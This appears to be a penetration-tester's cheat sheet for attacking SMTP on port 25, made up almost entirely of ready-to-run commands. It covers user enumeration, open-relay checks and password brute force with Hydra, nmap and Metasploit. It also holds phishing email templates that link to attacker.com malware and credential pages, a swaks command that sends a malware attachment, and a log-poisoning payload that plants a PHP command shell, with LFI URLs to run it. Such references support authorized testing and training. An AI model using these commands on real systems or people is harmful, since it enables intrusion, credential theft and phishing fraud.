# Port 25 - SMTP

## Table of Contents

- [Enumeration](#enumeration)
  - [Banner Grabbing](#banner-grabbing)
  - [Nmap Scripts](#nmap-scripts)
  - [smtp-user-enum](#smtp-user-enum)
  - [VRFY Command](#vrfy-command)
  - [EXPN Command](#expn-command)
  - [RCPT TO Enumeration](#rcpt-to-enumeration)
- [Open Relay Testing](#open-relay-testing)
- [Brute Force](#brute-force)
- [Exploitation](#exploitation)
  - [Send Email via Telnet](#send-email-via-telnet)
  - [Send Email via swaks](#send-email-via-swaks)
  - [Log Poisoning](#log-poisoning)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

### Banner Grabbing

> Get SMTP server banner

```shell
nc -nv $rhost 25
telnet $rhost 25
```

> Using nmap

```shell
nmap -p 25 -sV $rhost
nmap -p 25 --script=banner $rhost
```

### Nmap Scripts

> SMTP enumeration scripts

```shell
# All SMTP scripts
nmap -p 25 --script smtp-* $rhost

# Check for open relay
nmap -p 25 --script smtp-open-relay $rhost

# Enumerate users
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} $rhost

# Get server info
nmap -p 25 --script smtp-commands $rhost

# Check vulnerabilities
nmap -p 25 --script smtp-vuln* $rhost
```

### smtp-user-enum

> Download smtp-user-enum script

```shell
git clone https://github.com/pentestmonkey/smtp-user-enum.git
cd smtp-user-enum
```

> VRFY method (verify user)

```shell
./smtp-user-enum.pl -M VRFY -u root -t $rhost
./smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $rhost
```

> EXPN method (expand alias)

```shell
./smtp-user-enum.pl -M EXPN -u admin -t $rhost
./smtp-user-enum.pl -M EXPN -U users.txt -t $rhost
```

> RCPT TO method (most reliable)

```shell
./smtp-user-enum.pl -M RCPT -u admin -t $rhost
./smtp-user-enum.pl -M RCPT -U users.txt -t $rhost
./smtp-user-enum.pl -M RCPT -D target.com -U users.txt -t $rhost
```

### VRFY Command

> Manual user verification via telnet

```shell
telnet $rhost 25
EHLO attacker.com
VRFY root
VRFY admin
VRFY www-data
```

> Expected responses

```text
252 - User exists
550 - User does not exist
```

### EXPN Command

> Expand mailing list/alias

```shell
telnet $rhost 25
EHLO attacker.com
EXPN root
EXPN admin
EXPN postmaster
```

### RCPT TO Enumeration

> Enumerate users via RCPT TO command

```shell
telnet $rhost 25
EHLO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<root@target.com>
RCPT TO:<admin@target.com>
RCPT TO:<www-data@target.com>
```

> Response interpretation

```text
250 OK - User exists
550 Unknown user - User does not exist
553 Relaying denied - Server blocks relay
```

---

## Open Relay Testing

> Check if SMTP server allows relaying

```shell
telnet $rhost 25
EHLO attacker.com
MAIL FROM:<attacker@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Test Relay
This is a relay test.
.
QUIT
```

> Nmap open relay check

```shell
nmap -p 25 --script smtp-open-relay $rhost
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.domain=external.com $rhost
```

---

## Brute Force

### Hydra

> SMTP AUTH brute force

```shell
hydra -L users.txt -P passwords.txt $rhost smtp -V
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://$rhost -V
```

### Nmap

> SMTP brute force script

```shell
nmap -p 25 --script smtp-brute $rhost
nmap -p 25 --script smtp-brute --script-args userdb=users.txt,passdb=pass.txt $rhost
```

### Metasploit

> SMTP login scanner

```shell
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS $rhost
set USER_FILE /path/to/users.txt
run

use auxiliary/scanner/smtp/smtp_version
set RHOSTS $rhost
run
```

---

## Exploitation

### Send Email via Telnet

> Send complete email manually

```shell
telnet $rhost 25
EHLO attacker.com
MAIL FROM:<attacker@attacker.com>
RCPT TO:<victim@target.com>
DATA
From: attacker@attacker.com
To: victim@target.com
Subject: Important - Action Required
Date: Thu, 30 Jan 2026 10:00:00 -0000

This is a phishing email body.
Click here: http://attacker.com/malware

.
QUIT
```

### Send Email via swaks

> Swiss Army Knife for SMTP

```shell
# Install
apt install swaks

# Send basic email
swaks --to victim@target.com --from attacker@attacker.com --server $rhost --body "Test email"

# Send with attachment
swaks --to victim@target.com --from attacker@attacker.com --server $rhost --attach /path/to/malware.pdf

# With authentication
swaks --to victim@target.com --from user@target.com --server $rhost --auth LOGIN --auth-user admin --auth-password password

# HTML email with link
swaks --to victim@target.com --from it@target.com --server $rhost --header "Subject: Password Reset" --body '<html><body><a href="http://attacker.com/creds">Reset Password</a></body></html>' --header "Content-Type: text/html"
```

### Log Poisoning

> Inject PHP code for LFI exploitation

```shell
telnet $rhost 25
EHLO attacker.com
MAIL FROM:<?php system($_GET['cmd']); ?>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Body
.
QUIT
```

> Include mail log via LFI

```text
http://target.com/page.php?file=/var/log/mail.log&cmd=id
http://target.com/page.php?file=/var/mail/www-data&cmd=id
```

---

## Post-Exploitation

### Mail Log Locations

```text
/var/log/mail.log
/var/log/maillog
/var/log/mail/mail.log
/var/spool/mail/
/var/mail/
```

### Configuration Files

```text
/etc/postfix/main.cf
/etc/postfix/master.cf
/etc/sendmail.cf
/etc/exim4/exim4.conf.template
```

### Common Email Ports

| Port | Service | Description |
| --- | --- | --- |
| 25 | SMTP | Default SMTP |
| 465 | SMTPS | SMTP over SSL |
| 587 | Submission | SMTP with STARTTLS |
| 110 | POP3 | Retrieve emails |
| 995 | POP3S | POP3 over SSL |
| 143 | IMAP | Read emails |
| 993 | IMAPS | IMAP over SSL |

---

## See Also

- **[POP3](110-995-pop3.md)** - Email retrieval
- **[IMAP](143-993-imap.md)** - Email access
- **[File Inclusion](../../7.Web-Exploit/7.3.File-Inclusion.md)** - Log poisoning via LFI
